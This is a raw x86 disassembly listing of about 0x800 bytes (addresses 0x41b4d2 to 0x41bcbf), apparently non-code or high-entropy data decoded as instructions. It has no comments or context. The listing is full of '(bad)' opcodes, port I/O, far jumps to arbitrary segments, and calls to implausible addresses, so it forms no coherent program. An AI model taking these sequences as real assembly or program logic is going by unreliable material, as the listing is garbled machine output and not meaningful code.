  41b4d2:	hlt    
  41b4d3:	call   0xb62fa4bd
  41b4d8:	rcr    bl,cl
  41b4da:	int    0xdf
  41b4dc:	xlat   BYTE PTR ds:[ebx]
  41b4dd:	mov    esi,0xbcd7edde
  41b4e2:	aad    0xd0
  41b4e4:	in     eax,0x4
  41b4e6:	cli    
  41b4e7:	retf   
  41b4e8:	call   0xb32a82db
  41b4ed:	fstp   st(7)
  41b4ef:	fstp   st(5)
  41b4f1:	into   
  41b4f2:	iret   
  41b4f3:	out    0xc8,eax
  41b4f5:	int    0xf3
  41b4f7:	lods   al,BYTE PTR ds:[esi]
  41b4f8:	fcmovbe st,st(2)
  41b4fa:	lock cmc 
  41b4fc:	mov    edx,0xdde6d8b8
  41b501:	pop    es
  41b502:	call   esp
  41b504:	ret    
  41b505:	(bad)  
  41b507:	ffree  st(5)
  41b509:	loope  0x41b50b
  41b50b:	enter  0xbfca,0xc9
  41b50f:	(bad)  
  41b510:	stos   DWORD PTR es:[edi],eax
  41b511:	mov    esp,0xcdf6e0ee
  41b516:	icebp  
  41b517:	rcr    edi,cl
  41b519:	hlt    
  41b51a:	mov    ch,0xf7
  41b51c:	loop   0x41b4f6
  41b51e:	mov    eax,0xdfd8bff9
  41b523:	cmc    
  41b524:	sar    bh,0xe5
  41b527:	leave  
  41b528:	add    al,bh
  41b52a:	(bad)
  41b52d:	jmp    0xb2f55e1e
  41b532:	mov    bh,0xfb
  41b534:	fsub   st,st(7)
  41b536:	(bad)  
  41b538:	in     eax,0xf4
  41b53a:	out    dx,eax
  41b53b:	out    dx,al
  41b53c:	mov    esi,0xe3d5dd07
  41b541:	cli    
  41b542:	fild   WORD PTR [edx]
  41b544:	loop   0x41b528
  41b546:	fucom  st(5)
  41b548:	std    
  41b549:	fiadd  DWORD PTR [ecx+esi*8]
  41b54c:	jecxz  0x41b535
  41b54e:	test   eax,0xcef5acdc
  41b553:	icebp  
  41b554:	jmp    0x41b54e
  41b556:	retf   0xfcf3
  41b559:	call   0xd902b955
  41b55e:	rol    DWORD PTR ds:0xc2d8e5ed,cl
  41b564:	or     BYTE PTR [ecx],cl
  41b566:	fisttp DWORD PTR [edx]
  41b568:	enter  0xc10f,0xea
  41b56c:	fnstsw ax
  41b56e:	into   
  41b56f:	mov    esi,0xced1c8d4
  41b574:	idiv   al
  41b576:	aam    0xd8
  41b578:	icebp  
  41b579:	out    dx,al
  41b57a:	jmp    0xece3:0xd401dee9
  41b581:	(bad)  
  41b582:	or     edi,DWORD PTR [eax-0xb1e3601]
  41b588:	into   
  41b589:	(bad)  
  41b58b:	or     eax,0xeae6c2dd
  41b590:	repnz mov esp,0xe8d2d6e7
  41b596:	mov    ah,0xd1
  41b598:	(bad)  
  41b599:	mov    esi,0xb8f1e3ca
  41b59e:	mul    al
  41b5a0:	in     eax,dx
  41b5a1:	pop    es
  41b5a2:	cld    
  41b5a3:	or     bl,dl
  41b5a5:	(bad)  
  41b5a7:	retf   0xcc7
  41b5aa:	iret   
  41b5ab:	(bad)  
  41b5ac:	retf   
  41b5ad:	shl    BYTE PTR [eax-0x3e2c321a],cl
  41b5b3:	into   
  41b5b4:	loopne 0x41b58c
  41b5b6:	test   edi,0xf4edb5f9
  41b5bc:	mov    ebp,0xd3d7c7e2
  41b5c1:	in     al,0xfb
  41b5c3:	add    esp,edx
  41b5c5:	fcmovnu st,st(6)
  41b5c7:	retf   0xca0c
  41b5ca:	add    eax,eax
  41b5cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5cd:	call   0xe7357bc0
  41b5d2:	int    0xea
  41b5d4:	mov    ebx,0xdfbecdb5
  41b5d9:	mov    esi,0xb8f9dae2
  41b5de:	fdivr  st,st(0)
  41b5e0:	lock in al,dx
  41b5e2:	fcmovbe st,st(4)
  41b5e4:	out    0xc7,al
  41b5e6:	add    al,0xea
  41b5e8:	aam    0xde
  41b5ea:	rol    DWORD PTR [esi],0xec
  41b5ed:	out    0xe3,al
  41b5ef:	cmc    
  41b5f0:	call   0xc7327fbe
  41b5f5:	xlat   BYTE PTR ds:[ebx]
  41b5f6:	cli    
  41b5f7:	sti    
  41b5f8:	mov    edx,0x1d2beb9
  41b5fd:	int3   
  41b5fe:	mov    eax,0xd6dce1e3
  41b603:	add    al,cl
  41b605:	shl    al,1
  41b607:	stc    
  41b608:	jmp    0xe64f7ad5
  41b60d:	iret   
  41b60e:	out    0xee,al
  41b610:	test   eax,0xcad6a8c7
  41b616:	aad    0xb4
  41b618:	mov    bl,0xe9
  41b61a:	repz icebp 
  41b61c:	icebp  
  41b61d:	rol    al,1
  41b61f:	in     eax,dx
  41b620:	fild   DWORD PTR [edx]
  41b622:	clc    
  41b623:	cmc    
  41b624:	jecxz  0x41b629
  41b626:	cli    
  41b627:	jmp    0x143cc5f0
  41b62c:	shl    DWORD PTR [esi-0xf1c2f44],cl
  41b632:	retf   0xccea
  41b635:	sar    dh,0xd1
  41b638:	mov    ah,0xec
  41b63a:	retf   0xc2be
  41b63d:	jecxz  0x41b61f
  41b63f:	in     al,dx
  41b640:	sti    
  41b641:	fisttp QWORD PTR [ebx]
  41b643:	sar    cl,0x6
  41b646:	hlt    
  41b647:	(bad)  
  41b648:	(bad)  
  41b649:	or     ebp,ebx
  41b64b:	loopne 0x41b62c
  41b64d:	xlat   BYTE PTR ds:[ebx]
  41b64e:	ror    edx,1
  41b650:	out    dx,al
  41b651:	ret    
  41b652:	lds    esi,FWORD PTR [ebp-0x4b4b1238]
  41b658:	std    
  41b659:	sar    BYTE PTR [eax-0x2101464c],1
  41b65f:	fild   DWORD PTR [ebx]
  41b661:	(bad)  
  41b662:	repz (bad) 
  41b664:	fld    DWORD PTR [edx]
  41b666:	std    
  41b667:	loop   0x41b637
  41b669:	iret   
  41b66a:	shl    edx,0xb8
  41b66d:	scas   eax,DWORD PTR es:[edi]
  41b66e:	(bad)  
  41b66f:	(bad)  
  41b670:	mov    esp,0xead1e4d2
  41b675:	mov    ecx,0xd9dfddf5
  41b67a:	fdiv   st,st(3)
  41b67c:	mov    bh,0xfb
  41b67e:	aam    0xf4
  41b680:	inc    DWORD PTR [ecx]
  41b682:	shl    edx,cl
  41b684:	stc    
  41b685:	out    0xc0,eax
  41b687:	jmp    0xa9ad:0xc012ca09
  41b68e:	(bad)  [edi-0x2e191934]
  41b694:	fstp   TBYTE PTR [eax-0x1232531b]
  41b69a:	jmp    0x41b66d
  41b69c:	add    ebp,esp
  41b69e:	mov    DWORD PTR [eax],0xd4e1e2e0
  41b6a4:	fcomi  st,st(7)
  41b6a6:	std    
  41b6a7:	fxch   st(5)
  41b6a9:	add    esp,ecx
  41b6ab:	adc    dh,bl
  41b6ad:	mov    dl,0xe7
  41b6af:	jmp    0xc5d1:0xf4cdbce3
  41b6b6:	sar    ebp,cl
  41b6b8:	in     eax,0xc4
  41b6ba:	ret    
  41b6bb:	(bad)  
  41b6bd:	xlat   BYTE PTR ds:[ebx]
  41b6be:	sar    cl,1
  41b6c0:	loopne 0x41b6c3
  41b6c2:	hlt    
  41b6c3:	idiv   DWORD PTR [edi-0x24271f1c]
  41b6c9:	add    ebp,eax
  41b6cb:	out    0xb1,al
  41b6cd:	in     al,dx
  41b6ce:	out    dx,al
  41b6cf:	icebp  
  41b6d0:	(bad)
  41b6d3:	(bad)  
  41b6d4:	mov    al,0xf3
  41b6d6:	cmc    
  41b6d7:	stc    
  41b6d8:	into   
  41b6d9:	mov    ebp,0xf5dcf6ec
  41b6de:	add    eax,DWORD PTR [ecx]
  41b6e0:	add    edi,ebx
  41b6e2:	rcr    ebp,cl
  41b6e4:	fstp   st(6)
  41b6e6:	fisttp WORD PTR [eax]
  41b6e8:	add    al,0x0
  41b6ea:	retf   
  41b6eb:	(bad)  [ebx-0x1d57115a]
  41b6f1:	iret   
  41b6f2:	icebp  
  41b6f3:	fprem1 
  41b6f5:	mov    edx,0xf8efb5f3
  41b6fa:	lock cli 
  41b6fc:	cli    
  41b6fd:	loopne 0x41b6e2
  41b6ff:	repz repnz sar edx,1
  41b703:	cli    
  41b704:	(bad)  
  41b705:	leave  
  41b706:	add    DWORD PTR [edx],ecx
  41b708:	inc    dl
  41b70a:	push   es
  41b70b:	in     eax,0xcd
  41b70d:	fnsave [edx-0x3a184e15]
  41b713:	xlat   BYTE PTR ds:[ebx]
  41b714:	(bad)  
  41b715:	retf   0xb0d6
  41b718:	fstp   TBYTE PTR [edi-0x2d41fe2d]
  41b71e:	fld    DWORD PTR [edi]
  41b720:	out    0xfa,eax
  41b722:	jecxz  0x41b722
  41b724:	clc    
  41b725:	lock add dl,dh
  41b728:	clc    
  41b729:	in     al,dx
  41b72a:	in     eax,0xfa
  41b72c:	scas   eax,DWORD PTR es:[edi]
  41b72d:	mov    cl,0xbe
  41b72f:	int3   
  41b730:	in     eax,dx
  41b731:	repnz mov bh,0xce
  41b734:	lock enter 0xc9d3,0xd3
  41b739:	int3   
  41b73a:	in     eax,dx
  41b73b:	iret   
  41b73c:	fdivp  st(1),st
  41b73e:	repz aam 0xd9
  41b741:	clc    
  41b742:	cmc    
  41b743:	rol    BYTE PTR [ecx],0xa
  41b746:	push   cs
  41b747:	retf   0xc6df
  41b74a:	enter  0xc9ff,0xe2
  41b74e:	mov    ebp,0xb0d4cfae
  41b753:	fxam   
  41b755:	fcmovnb st,st(7)
  41b757:	mov    eax,0xe9cdcbb3
  41b75c:	ret    0xc7c2
  41b75f:	shl    ah,1
  41b761:	add    esp,edi
  41b763:	(bad)  
  41b764:	aad    0xc4
  41b766:	add    edi,ebx
  41b768:	push   es
  41b769:	in     eax,0x3
  41b76b:	rol    edi,cl
  41b76d:	ret    
  41b76e:	repz cmc 
  41b770:	leave  
  41b771:	out    dx,eax
  41b772:	icebp  
  41b773:	retf   
  41b774:	xlat   BYTE PTR ds:[ebx]
  41b775:	mov    ebx,0xf6b9e9b4
  41b77a:	mov    edx,0xded8c2db
  41b77f:	push   es
  41b780:	jecxz  0x41b754
  41b782:	(bad)  
  41b783:	(bad)  
  41b784:	add    dl,cl
  41b786:	inc    BYTE PTR [edi]
  41b788:	in     eax,dx
  41b789:	loop   0x41b791
  41b78b:	adc    ebp,DWORD PTR [edi-0x4e3c0956]
  41b791:	mov    dl,0xd5
  41b793:	rcl    bl,0xd2
  41b796:	cli    
  41b797:	enter  0xdfed,0xd0
  41b79b:	(bad)  
  41b79c:	clc    
  41b79d:	jecxz  0x41b799
  41b79f:	aam    0xd5
  41b7a1:	repz lock (bad) 
  41b7a4:	xlat   BYTE PTR ds:[ebx]
  41b7a5:	fadd   st(1),st
  41b7a7:	out    0xcd,al
  41b7a9:	fucom  st(7)
  41b7ab:	icebp  
  41b7ac:	into   
  41b7ad:	stos   BYTE PTR es:[edi],al
  41b7ae:	mov    al,0xc9
  41b7b0:	int    0xca
  41b7b2:	ret    0xcad9
  41b7b5:	stc    
  41b7b6:	(bad)  
  41b7b8:	mov    ch,0xff
  41b7ba:	fucomp st(0)
  41b7bc:	xlat   BYTE PTR ds:[ebx]
  41b7bd:	ret    
  41b7be:	iret   
  41b7bf:	add    eax,0xc3f0d5f3
  41b7c4:	push   es
  41b7c5:	jmp    0xd9268eaa
  41b7ca:	retf   
  41b7cb:	jecxz  0x41b7ba
  41b7cd:	mov    ebp,0xdbdcafdd
  41b7d2:	mov    cl,0xba
  41b7d4:	fldcw  WORD PTR [esi-0x2a101147]
  41b7da:	fcomip st,st(7)
  41b7dc:	clc    
  41b7dd:	jecxz  0x41b7be
  41b7df:	add    dh,bl
  41b7e1:	fcmovu st,st(7)
  41b7e3:	fadd   DWORD PTR [ecx]
  41b7e5:	pop    es
  41b7e6:	out    dx,eax
  41b7e7:	in     eax,dx
  41b7e8:	retf   0xebd9
  41b7eb:	iret   
  41b7ec:	mov    ecx,0xeea4c3ef
  41b7f1:	out    0xfa,eax
  41b7f3:	in     al,0xb0
  41b7f5:	div    DWORD PTR [esi-0x422d33]
  41b7fb:	repz fild DWORD PTR [edx]
  41b7fe:	mov    esi,0xd804d2f5
  41b803:	fucomi st,st(1)
  41b805:	clc    
  41b806:	fsubr  st,st(6)
  41b808:	fsubr  st(5),st
  41b80a:	pmaxsw mm5,mm6
  41b80d:	mov    cl,0xae
  41b80f:	out    0xe8,eax
  41b811:	in     al,dx
  41b812:	retf   0xfbc8
  41b815:	sti    
  41b816:	repnz mov esi,0xdbcad0eb
  41b81c:	stc    
  41b81d:	(bad)  
  41b81f:	rcl    esp,0xd0
  41b822:	repnz (bad) 
  41b825:	jecxz  0x41b811
  41b827:	std    
  41b828:	add    al,0xe3
  41b82a:	out    0xf2,al
  41b82c:	(bad)  
  41b82e:	repz div BYTE PTR [ebp-0x16260a36]
  41b835:	in     eax,0xd2
  41b837:	std    
  41b838:	lock (bad) 
  41b83a:	aad    0xcc
  41b83c:	mov    eax,0xf9dfcffa
  41b841:	cld    
  41b842:	les    eax,FWORD PTR [esi]
  41b844:	in     eax,0xc1
  41b846:	clc    
  41b847:	mov    esp,0xcd9c801
  41b84c:	loope  0x41b82d
  41b84e:	retf   0xe2eb
  41b851:	jmp    0x41b841
  41b853:	mul    ecx
  41b855:	int    0xef
  41b857:	not    esp
  41b859:	out    dx,eax
  41b85a:	fcom   st(4)
  41b85c:	rcr    ebp,1
  41b85e:	mov    ch,0xe7
  41b860:	in     eax,dx
  41b861:	inc    DWORD PTR [esi]
  41b863:	stc    
  41b864:	(bad)  
  41b866:	push   es
  41b867:	aam    0xc8
  41b869:	or     al,0xe0
  41b86b:	enter  0xebe9,0xcd
  41b86f:	scas   al,BYTE PTR es:[edi]
  41b870:	mov    cl,0xb3
  41b872:	shr    al,0xe0
  41b875:	fdiv   DWORD PTR [ecx+edi*4-0x101c0209]
  41b87c:	clc    
  41b87d:	ret    0xbef8
  41b880:	in     eax,dx
  41b881:	add    bl,bl
  41b883:	fdiv   st,st(6)
  41b885:	xlat   BYTE PTR ds:[ebx]
  41b886:	sti    
  41b887:	(bad)
  41b88a:	leave  
  41b88b:	repz mov eax,0xeed0e3e7
  41b891:	(bad)
  41b894:	iret   
  41b895:	shr    bl,0xbf
  41b898:	(bad)  
  41b89a:	in     eax,dx
  41b89b:	fdivr  st(6),st
  41b89d:	fadd   QWORD PTR [edi]
  41b89f:	in     eax,0xdb
  41b8a1:	std    
  41b8a2:	fcomip st,st(2)
  41b8a4:	(bad)  
  41b8a5:	aad    0x1
  41b8a7:	add    ch,dl
  41b8a9:	in     eax,dx
  41b8aa:	out    dx,eax
  41b8ab:	jmp    0xb7f7:0xdeebebcf
  41b8b2:	fneni(8087 only) 
  41b8b4:	(bad)  
  41b8b5:	sti    
  41b8b6:	jmp    0x41b880
  41b8b8:	mov    bh,0x3
  41b8ba:	repnz (bad) 
  41b8bd:	lock fsin 
  41b8c0:	fsub   st,st(2)
  41b8c2:	ret    
  41b8c3:	retf   
  41b8c4:	icebp  
  41b8c5:	jmp    0xdc9:0xebe0e1f9
  41b8cc:	fpatan 
  41b8ce:	mov    bl,0xdc
  41b8d0:	imul   bh
  41b8d2:	fidiv  DWORD PTR [edx-0x252f30]
  41b8d8:	in     al,dx
  41b8d9:	mov    ebp,0x1ccca03
  41b8de:	mul    ch
  41b8e0:	aad    0xf7
  41b8e2:	pop    es
  41b8e3:	fadd   st,st(7)
  41b8e5:	imul   esi
  41b8e7:	iret   
  41b8e8:	fld    QWORD PTR [ebx]
  41b8ea:	add    ah,dh
  41b8ec:	mov    ecx,0xc8bee7ec
  41b8f1:	shl    esi,0xec
  41b8f4:	in     eax,dx
  41b8f5:	shl    BYTE PTR [edi-0x4023b1c],1
  41b8fb:	loop   0x41b8d5
  41b8fd:	in     al,dx
  41b8fe:	push   es
  41b8ff:	sar    BYTE PTR [edi-0x82bff22],1
  41b905:	or     BYTE PTR [esp+eax*8],al
  41b908:	or     eax,0xbfd9dde7
  41b90d:	lods   al,BYTE PTR ds:[esi]
  41b90e:	jecxz  0x41b8e7
  41b910:	loope  0x41b8ed
  41b912:	mov    cl,0xdb
  41b914:	(bad)  
  41b915:	in     eax,0xb7
  41b917:	shr    bh,1
  41b919:	fdivr  st(5),st
  41b91b:	cmc    
  41b91c:	int    0xf5
  41b91e:	in     al,dx
  41b91f:	ret    0xc6be
  41b922:	aad    0xf4
  41b924:	(bad)  
  41b925:	(bad)  
  41b926:	stc    
  41b927:	or     cl,dh
  41b929:	jmp    0xb00ebc13
  41b92e:	in     eax,dx
  41b92f:	icebp  
  41b930:	call   0xb6288d01
  41b935:	out    0xfa,eax
  41b937:	mov    ch,0xbb
  41b939:	int    0xcb
  41b93b:	sar    DWORD PTR [edx-0x2d1d2933],cl
  41b941:	add    eax,0xf7f1e106
  41b946:	out    dx,al
  41b947:	in     eax,dx
  41b948:	(bad)  
  41b949:	repz int 0x7
  41b94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b94d:	mov    esi,0xebe2eae0
  41b952:	mov    ebx,0xf3aef7ef
  41b957:	mov    edx,0xeadee9fe
  41b95c:	mov    esp,0xdedbecdf
  41b961:	ret    
  41b962:	repnz in eax,0x0
  41b965:	loop   0x41b945
  41b967:	or     eax,0xecfcdbef
  41b96c:	ret    0xf1b2
  41b96f:	mov    esi,0xe6d6f0b5
  41b974:	jmp    0xf1eb:0xbdb6ccb8
  41b97b:	into   
  41b97c:	loop   0x41b96d
  41b97e:	aam    0xbe
  41b980:	add    DWORD PTR [esi-0x29fa1e20],edi
  41b986:	retf   0xdaea
  41b989:	loop   0x41b970
  41b98b:	loope  0x41b95f
  41b98d:	rcl    cl,1
  41b98f:	repnz int3 
  41b991:	fucomi st,st(4)
  41b993:	in     al,0xd0
  41b995:	(bad)  
  41b996:	call   0xf712af47
  41b99b:	call   0x619b297
  41b9a0:	xlat   BYTE PTR ds:[ebx]
  41b9a1:	cld    
  41b9a2:	add    eax,0xe0fbc4d0
  41b9a7:	hlt    
  41b9a8:	ret    
  41b9a9:	(bad)
  41b9ac:	retf   
  41b9ad:	stos   BYTE PTR es:[edi],al
  41b9ae:	mul    edi
  41b9b0:	into   
  41b9b1:	mov    ch,0xf3
  41b9b3:	mov    ah,0xd7
  41b9b5:	ror    ah,0xf9
  41b9b8:	stc    
  41b9b9:	jmp    0xf4007db1
  41b9be:	fsub   st,st(6)
  41b9c0:	fadd   DWORD PTR [ecx]
  41b9c2:	inc    bh
  41b9c4:	add    esp,esp
  41b9c6:	lds    eax,FWORD PTR ds:0xfa02dfff
  41b9cc:	fadd   st(2),st
  41b9ce:	in     al,0xec
  41b9d0:	aam    0xc1
  41b9d2:	into   
  41b9d3:	retf   
  41b9d4:	(bad)  
  41b9d5:	enter  0xcceb,0xe8
  41b9d9:	repz jmp 0x1d5:0xc3beefce
  41b9e1:	shl    ch,1
  41b9e3:	xlat   BYTE PTR ds:[ebx]
  41b9e4:	or     dl,al
  41b9e6:	enter  0xe0eb,0xe4
  41b9ea:	int    0xff
  41b9ec:	(bad)  
  41b9ed:	lods   al,BYTE PTR ds:[esi]
  41b9ee:	(bad)  
  41b9ef:	mov    al,0xd3
  41b9f1:	mov    cl,0xb4
  41b9f3:	mov    ch,0xb3
  41b9f5:	mov    edx,0xf6c5c5ad
  41b9fa:	shl    bl,1
  41b9fc:	stc    
  41b9fd:	into   
  41b9fe:	mov    eax,0x703f8e6
  41ba03:	in     al,0xe9
  41ba05:	cli    
  41ba06:	(bad)  
  41ba07:	(bad)
  41ba0a:	(bad)  
  41ba0c:	shl    BYTE PTR [ebx-0x35425734],0xb0
  41ba13:	in     eax,0xd1
  41ba15:	mov    bh,0xb4
  41ba17:	in     al,0xb9
  41ba19:	leave  
  41ba1a:	sti    
  41ba1b:	dec    ch
  41ba1d:	mov    esi,0xc0bfd2fa
  41ba22:	push   es
  41ba23:	(bad)  
  41ba24:	out    0xdc,eax
  41ba26:	fprem1 
  41ba28:	in     eax,dx
  41ba29:	add    bh,bl
  41ba2b:	fcomip st,st(2)
  41ba2d:	call   0xb410a2e1
  41ba32:	loopne 0x41b9ee
  41ba34:	hlt    
  41ba35:	call   0xbd269527
  41ba3a:	int3   
  41ba3b:	sti    
  41ba3c:	iret   
  41ba3d:	mov    esp,0xd3df0100
  41ba42:	mov    esp,0xcb0be601
  41ba47:	pop    es
  41ba48:	fadd   DWORD PTR [ebx]
  41ba4a:	pop    es
  41ba4b:	add    dh,ah
  41ba4d:	int3   
  41ba4e:	in     eax,dx
  41ba4f:	jecxz  0x41ba1f
  41ba51:	int3   
  41ba52:	loopne 0x41ba18
  41ba54:	rol    ah,1
  41ba56:	jmp    0xbd1c7555
  41ba5b:	mov    esp,0xb5edfe
  41ba60:	in     eax,0xc7
  41ba62:	lock stc 
  41ba64:	test   DWORD PTR [ebx],0xe8c9c9df
  41ba6a:	fiadd  DWORD PTR [esi]
  41ba6c:	int    0xb3
  41ba6e:	(bad)  
  41ba6f:	mov    ebp,0xcaa9fbce
  41ba74:	mov    dh,0xd7
  41ba76:	retf   
  41ba77:	sar    dl,cl
  41ba79:	lock (bad) 
  41ba7b:	ret    
  41ba7c:	loop   0x41ba58
  41ba7e:	test   dh,0xf8
  41ba81:	clc    
  41ba82:	loopne 0x41ba46
  41ba84:	rcr    dh,1
  41ba86:	sti    
  41ba87:	enter  0x5e6,0xfe
  41ba8b:	adc    ch,BYTE PTR [edx-0x28371f13]
  41ba91:	mov    bl,0xc1
  41ba93:	into   
  41ba94:	imul   BYTE PTR [esi-0x29321412]
  41ba9a:	cmc    
  41ba9b:	repnz sar BYTE PTR [ecx-0x2518422b],cl
  41baa2:	cli    
  41baa3:	test   ebx,0xe3e0cb08
  41baa9:	aam    0xb
  41baab:	fld    st(7)
  41baad:	icebp  
  41baae:	ret    
  41baaf:	(bad)  
  41bab0:	scas   eax,DWORD PTR es:[edi]
  41bab1:	scas   al,BYTE PTR es:[edi]
  41bab2:	mov    bh,0xb2
  41bab4:	rol    ch,cl
  41bab6:	fcomi  st,st(7)
  41bab8:	fdivrp st(1),st
  41baba:	mov    eax,0xded4dcfb
  41babf:	sar    ecx,1
  41bac1:	(bad)  
  41bac2:	xlat   BYTE PTR ds:[ebx]
  41bac3:	jmp    0xe50d:0xebc4c5ea
  41baca:	fnstsw ax
  41bacc:	out    0xd2,al
  41bace:	int    0xf0
  41bad0:	aam    0xeb
  41bad2:	rcl    dh,cl
  41bad4:	mov    edx,0xd9fbf4c8
  41bad9:	mov    eax,0xffeef3ce
  41bade:	mov    ebp,0xe4ebc0e6
  41bae3:	hlt    
  41bae4:	idiv   al
  41bae6:	faddp  st(7),st
  41bae8:	or     al,0xcb
  41baea:	shl    ecx,0xee
  41baed:	loopne 0x41bad6
  41baef:	enter  0xb7ee,0xf6
  41baf3:	enter  0xedaf,0xc7
  41baf7:	cli    
  41baf8:	clc    
  41baf9:	out    dx,al
  41bafa:	aad    0xb9
  41bafc:	cli    
  41bafd:	fxch   st(4)
  41baff:	into   
  41bb00:	mov    edi,0xe7e9f5fb
  41bb05:	sti    
  41bb06:	or     bh,dh
  41bb08:	or     ecx,esp
  41bb0a:	add    ch,bh
  41bb0c:	loop   0x41bab8
  41bb0e:	(bad)  
  41bb0f:	(bad)  
  41bb10:	repnz stos BYTE PTR es:[edi],al
  41bb12:	out    0xb6,al
  41bb14:	out    dx,eax
  41bb15:	loopne 0x41bb16
  41bb17:	mov    al,0xe5
  41bb19:	in     eax,dx
  41bb1a:	mov    edi,0xe1c2e8fd
  41bb1f:	(bad)  
  41bb20:	test   BYTE PTR [edi],0xdc
  41bb23:	jecxz  0x41bb2d
  41bb25:	stc    
  41bb26:	clc    
  41bb27:	loopne 0x41bb28
  41bb29:	into   
  41bb2a:	out    dx,eax
  41bb2b:	add    ecx,esp
  41bb2d:	lock mov esp,0xd7c8caf6
  41bb33:	in     al,dx
  41bb34:	loope  0x41bb01
  41bb36:	into   
  41bb37:	in     eax,0xfe
  41bb39:	jmp    0x41baf7
  41bb3b:	mov    ebp,0x2bfeddf
  41bb40:	rol    DWORD PTR [edi],cl
  41bb42:	mov    esp,0xe607d7db
  41bb47:	clc    
  41bb48:	(bad)  
  41bb49:	int3   
  41bb4a:	(bad)  
  41bb4c:	repz jmp 0xdd2eae20
  41bb52:	shl    ah,0xcf
  41bb55:	loopne 0x41bb26
  41bb57:	repz fxtract 
  41bb5a:	mov    edx,0xcebade
  41bb5f:	fcmovnu st,st(5)
  41bb61:	aam    0xfd
  41bb63:	retf   0xbe06
  41bb66:	add    ecx,ebx
  41bb68:	(bad)  
  41bb69:	into   
  41bb6a:	pop    es
  41bb6b:	adc    edx,edx
  41bb6d:	lods   al,BYTE PTR ds:[esi]
  41bb6e:	call   0xc52da226
  41bb73:	lods   al,BYTE PTR ds:[esi]
  41bb74:	mov    cl,0xd2
  41bb76:	(bad)  
  41bb78:	test   dl,0xd7
  41bb7b:	shl    bh,cl
  41bb7d:	mov    dh,0xef
  41bb7f:	xlat   BYTE PTR ds:[ebx]
  41bb80:	mov    ebx,0xe5f7e7f6
  41bb85:	fsubrp st(7),st
  41bb87:	out    0x4,eax
  41bb89:	iret   
  41bb8a:	out    0x2,al
  41bb8c:	out    dx,eax
  41bb8d:	enter  0xe7d2,0xe7
  41bb91:	hlt    
  41bb92:	lods   eax,DWORD PTR ds:[esi]
  41bb93:	int3   
  41bb94:	mov    al,0xfb
  41bb96:	imul   bh
  41bb98:	fld1   
  41bb9a:	jmp    0xe136799a
  41bb9f:	aad    0xe2
  41bba1:	repnz retf 
  41bba3:	pop    es
  41bba4:	fadd   QWORD PTR [esi]
  41bba6:	retf   
  41bba7:	jmp    0x41bb6f
  41bba9:	(bad)  
  41bbaa:	cld    
  41bbab:	clc    
  41bbac:	fld    st(3)
  41bbae:	test   al,0xad
  41bbb0:	retf   
  41bbb1:	(bad)  
  41bbb2:	in     eax,0xc0
  41bbb4:	int    0xfa
  41bbb6:	jmp    0xe41291a9
  41bbbb:	fild   DWORD PTR [ebx]
  41bbbd:	ret    
  41bbbe:	in     eax,dx
  41bbbf:	ret    0xd9bc
  41bbc2:	inc    DWORD PTR [ebx]
  41bbc4:	fcmovbe st,st(5)
  41bbc6:	shr    bl,0xed
  41bbc9:	add    ecx,eax
  41bbcb:	ffreep st(4)
  41bbcd:	mov    dl,0xa9
  41bbcf:	out    0xc7,al
  41bbd1:	jmp    0xf11287c7
  41bbd6:	(bad)  
  41bbd7:	idiv   BYTE PTR [ebp-0x102bfc38]
  41bbdd:	rcl    ah,cl
  41bbdf:	mov    ebp,0x7fad702
  41bbe4:	retf   
  41bbe5:	cli    
  41bbe6:	out    0xe2,eax
  41bbe8:	(bad)  
  41bbea:	sar    ecx,0xb8
  41bbed:	out    0xc2,eax
  41bbef:	jmp    0xe83192a1
  41bbf4:	into   
  41bbf5:	(bad)  
  41bbf7:	repz int 0xf9
  41bbfa:	repz mov eax,0xc3be07f5
  41bc00:	xlat   BYTE PTR ds:[ebx]
  41bc01:	sar    bh,1
  41bc03:	fmul   QWORD PTR [ecx]
  41bc05:	jmp    0xe0ff:0xd4d9e4f6
  41bc0c:	test   eax,0xd0b3c1ae
  41bc11:	out    dx,eax
  41bc12:	mov    dl,0xea
  41bc14:	shl    bh,cl
  41bc16:	mov    ch,0xe8
  41bc18:	call   0xf019bae7
  41bc1d:	(bad)  
  41bc1f:	std    
  41bc20:	fst    st(4)
  41bc22:	repnz fcmovbe st,st(1)
  41bc25:	sti    
  41bc26:	out    0xff,eax
  41bc28:	fxch   st(4)
  41bc2a:	sti    
  41bc2b:	or     ebp,DWORD PTR [edi-0x4c1a3248]
  41bc31:	enter  0xe4e1,0xf2
  41bc35:	leave  
  41bc36:	mul    ch
  41bc38:	out    dx,al
  41bc39:	retf   0xf9bd
  41bc3c:	sti    
  41bc3d:	hlt    
  41bc3e:	out    dx,al
  41bc3f:	mov    esp,0xc0f1bdf1
  41bc44:	or     bl,bh
  41bc46:	stc    
  41bc47:	jmp    0xc2c4:0xe7f2cdc5
  41bc4e:	(bad)  
  41bc50:	mov    dh,0xfb
  41bc52:	fcomi  st,st(6)
  41bc54:	iret   
  41bc55:	mov    bh,0xf5
  41bc57:	cmc    
  41bc58:	mov    bl,0xd2
  41bc5a:	add    bh,bh
  41bc5c:	repz hlt 
  41bc5e:	mov    esi,0xc1d4d1f1
  41bc63:	add    eax,0xc5fc09e1
  41bc68:	int    0x6
  41bc6a:	fisttp DWORD PTR [edi]
  41bc6c:	ret    
  41bc6d:	loope  0x41bc1e
  41bc6f:	out    0xae,eax
  41bc71:	in     al,0xc4
  41bc73:	icebp  
  41bc74:	jmp    0xc9f2:0xeaf1c9ed
  41bc7b:	cld    
  41bc7c:	mov    ebx,0xcdc3e6d3
  41bc81:	(bad)  
  41bc82:	fsub   st,st(3)
  41bc84:	lock cmc 
  41bc86:	out    0xe3,al
  41bc88:	or     ecx,DWORD PTR [ecx]
  41bc8a:	lds    ecx,FWORD PTR [ecx]
  41bc8c:	retf   0xd2ee
  41bc8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc90:	ret    0xdbd5
  41bc93:	out    0xc6,al
  41bc95:	out    dx,eax
  41bc96:	ror    dh,cl
  41bc98:	jmp    0x41bc79
  41bc9a:	out    dx,al
  41bc9b:	fxch   st(4)
  41bc9d:	fdivr  st(2),st
  41bc9f:	aad    0xf5
  41bca1:	add    al,0x3
  41bca3:	(bad)  
  41bca4:	(bad)  
  41bca5:	(bad)  
  41bca7:	(bad)  
  41bca8:	loopne 0x41bc97
  41bcaa:	repz int 0xf1
  41bcad:	shr    BYTE PTR [ebp+eiz*8-0x2438194f],0xb9
  41bcb5:	retf   
  41bcb6:	out    0xf2,al
  41bcb8:	call   0xdf10b887
  41bcbd:	shl    dh,1
  41bcbf:	out    dx,al
